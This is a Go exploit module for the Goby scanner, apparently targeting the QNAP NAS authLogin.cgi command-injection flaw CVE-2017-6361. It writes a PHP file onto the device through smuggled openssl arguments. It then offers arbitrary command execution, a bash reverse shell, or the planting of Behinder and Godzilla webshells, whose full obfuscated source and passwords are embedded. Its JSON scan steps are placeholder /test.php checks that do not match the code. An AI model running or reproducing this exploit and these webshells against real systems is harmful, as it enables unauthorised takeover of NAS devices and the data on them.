package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "QNAP NAS authLogin.cgi command execution vulnerability (CVE-2017-6361)",
    "Description": "<p>QNAP NAS (Network Attached Storage) is a device specially designed for storing, recovering, and managing data. QNAP offers many different NAS models suitable for homes, small offices, and large enterprises. QNAP NAS can share data with multiple devices over the network, providing data backup, file synchronization, remote access, and more. QNAP NAS also supports third-party applications, providing more functionality and services to users.</p><p>Attackers can exploit this vulnerability to execute arbitrary commands, write backdoors, gain server permissions, and thereby control the entire web server by sending shell meta-characters through unauthorized interfaces.</p>",
    "Product": "QNAP-NAS",
    "Homepage": "https://www.qnap.com/",
    "DisclosureDate": "2017-05-24",
    "PostTime": "2023-12-26",
    "Author": "marsjob@163.com",
    "FofaQuery": "(((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\")",
    "GobyQuery": "(((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\")",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands, write backdoors, gain server permissions, and thereby control the entire web server by sending shell meta-characters through unauthorized interfaces.</p>",
    "Recommendation": "<p>1. The manufacturer has currently released related patches, please upgrade the product in time.</p><p>2. Set access policies through security equipment such as firewalls, and establish a whitelist for access.</p><p>3. If not necessary, prohibit public network access to this system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php phpinfo(); ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2017-6361"
    ],
    "CNNVD": [
        "CNNVD-201702-940"
    ],
    "CNVD": [
        "CNVD-2017-10395"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "QNAP NAS authLogin.cgi 命令执行漏洞（CVE-2017-6361）",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP NAS（网络附加存储）是一种专为存储、恢复和管理数据而设计的设备。QNAP 提供了许多不同的 NAS 模型，适合家庭、小型办公室和大型企业。QNAP NAS 可通过网络与多个设备共享数据，提供数据备份、文件同步、远程访问等功能。QNAP NAS还支持第三方应用程序，为用户提供更多的功能和服务。</p><p>攻击者可通过未授权接口发送 shell 元字符利用该漏洞执行任意命令，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "Recommendation": "<p>1、目前厂商已发布相关补丁，及时进行产品升级。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权接口发送 shell 元字符利用该漏洞执行任意命令，写入后门，获取服务器权限，进而控制整个 web 服务器。<br><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "QNAP NAS authLogin.cgi command execution vulnerability (CVE-2017-6361)",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP NAS (Network Attached Storage) is a device specially designed for storing, recovering, and managing data. QNAP offers many different NAS models suitable for homes, small offices, and large enterprises. QNAP NAS can share data with multiple devices over the network, providing data backup, file synchronization, remote access, and more. QNAP NAS also supports third-party applications, providing more functionality and services to users.<br></p><p>Attackers can exploit this vulnerability to execute arbitrary commands, write backdoors, gain server permissions, and thereby control the entire web server by sending shell meta-characters through unauthorized interfaces.<br></p>",
            "Recommendation": "<p>1. The manufacturer has currently released related patches, please upgrade the product in time.</p><p>2. Set access policies through security equipment such as firewalls, and establish a whitelist for access.</p><p>3. If not necessary, prohibit public network access to this system.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands, write backdoors, gain server permissions, and thereby control the entire web server by sending shell meta-characters through unauthorized interfaces.<br><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10901"
}`
	filename := goutils.RandomHexString(6) + ".php"

	base64Encode37YdFyedh38RdkG := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}

	sendpayload37YdFyedh38RdkG := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		paylaodConfig := httpclient.NewPostRequestConfig("/cgi-bin/authLogin.cgi")
		paylaodConfig.VerifyTls = false
		paylaodConfig.FollowRedirect = false
		paylaodConfig.Data = "reboot_notice_msg=enc" + payload
		return httpclient.DoHttpRequest(hostInfo, paylaodConfig)
	}

	// 文件上传
	uploadFlag37GFgyY37Rdb := func(hostInfo *httpclient.FixUrl, content, param string) (*httpclient.HttpResponse, error) {
		checkFileConfig := httpclient.NewPostRequestConfig("/apps/" + filename)
		checkFileConfig.VerifyTls = false
		checkFileConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); resp == nil && err != nil {
			return nil, err
		} else if resp != nil && resp.StatusCode != 200 {
			payload := " -base64 -d -out /mnt/ext/opt/apps/" + filename + " -k A''''''''''''''''''''''''''\n" + base64Encode37YdFyedh38RdkG(content)
			if trojan, err := sendpayload37YdFyedh38RdkG(hostInfo, payload); trojan == nil && err != nil {
				return nil, err
			} else if trojan != nil && trojan.StatusCode != 200 && !strings.Contains(trojan.Utf8Html, "<QDocRoot version") {
				return nil, errors.New("漏洞利用失败")
			}
			time.Sleep(2)
			// 文件不存在，重新检查文件是否被创建成功
			if check, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); check == nil && err != nil {
				return nil, err
			} else if check != nil && check.StatusCode != 200 {
				return nil, errors.New("创建文件失败")
			}
		}
		// 文件存在，直接发送
		checkRequestConfig := httpclient.NewPostRequestConfig("/apps/" + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		if len(param) > 0 {
			checkRequestConfig.Data = param
		}
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			resp, _ := uploadFlag37GFgyY37Rdb(hostInfo, `<?php system(file_get_contents('php://input'));`, `echo `+checkStr)
			success := resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkStr)
			if success {
				ss.VulURL = hostInfo.FixedHostInfo + `/cgi-bin/authLogin.cgi`
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				if resp, err := uploadFlag37GFgyY37Rdb(expResult.HostInfo, `<?php system(file_get_contents('php://input'));`, cmd); resp != nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				} else {
					uploadFlag37GFgyY37Rdb(expResult.HostInfo, `<?php system(file_get_contents('php://input'));`, godclient.ReverseTCPByBash(rp))
					select {
					case webConsoleID := <-waitSessionCh:
						u, err := url.Parse(webConsoleID)
						if err != nil {
							expResult.Success = false
							expResult.Output = err.Error()
							return expResult
						}
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					case <-time.After(time.Second * 20):
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
						return expResult
					}
				}
			} else if attackType == "webshell" {
				var content string
				webshell := goutils.B2S(ss.Params["webshell"])
				filename = goutils.RandomHexString(16) + ".php"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else {
					content = goutils.B2S(ss.Params["content"])
					filename = goutils.B2S(ss.Params["filename"])
				}
				if resp, err := uploadFlag37GFgyY37Rdb(expResult.HostInfo, content, ``); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/apps/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: php"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
